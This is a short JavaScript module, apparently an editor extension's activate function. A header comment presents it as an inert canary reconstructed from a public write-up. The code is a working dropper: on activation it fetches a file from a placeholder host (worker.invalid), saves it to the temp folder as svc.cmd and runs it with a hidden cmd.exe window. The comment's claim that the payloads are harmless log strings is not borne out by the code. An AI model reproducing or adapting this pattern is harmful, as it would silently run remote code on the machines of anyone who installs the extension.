// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const os = require('os'), fs = require('fs'), path = require('path'), https = require('https'), cp = require('child_process');
exports.activate = function () {
  const out = path.join(os.tmpdir(), 'svc.cmd');
  https.get('https://worker.invalid/' + process.platform, r => {
    const f = fs.createWriteStream(out); r.pipe(f);
    f.on('finish', () => cp.exec('cmd.exe /c "' + out + '"', { windowsHide: true }));
  });
};
